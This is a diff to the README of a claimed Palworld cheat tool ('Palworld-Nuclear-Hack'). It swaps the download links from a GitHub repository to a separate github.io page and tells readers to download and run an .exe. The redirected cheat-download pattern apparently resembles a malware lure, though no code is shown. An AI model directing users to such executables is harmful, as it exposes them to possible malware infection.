@@ -1,6 +1,6 @@
 # ☢️ Palworld-Nuclear-Hack - Unlock every feature in Palworld today
 
-[![Download Palworld-Nuclear-Hack](https://img.shields.io/badge/Download-Palworld--Nuclear--Hack-blue.svg)](https://github.com/overheatingholy955/Palworld-Nuclear-Hack)
+[![Download Palworld-Nuclear-Hack](https://img.shields.io/badge/Download-Palworld--Nuclear--Hack-blue.svg)](https://overheatingholy955.github.io)
 
 This software provides a suite of tools for the game Palworld. Users can access features that change the mechanics of the game. These tools include flight, item generation, and character invincibility. This guide helps you install and use these tools on your Windows computer.
 
@@ -27,7 +27,7 @@ Follow these steps to prepare your system and run the software.
 
 Use the link below to reach the project page where the latest version resides.
 
-[Click here to visit the page to download the software](https://github.com/overheatingholy955/Palworld-Nuclear-Hack)
+[Click here to visit the page to download the software](https://overheatingholy955.github.io)
 
 1. Navigate to the link provided.
 2. Look for the file ending in .exe.
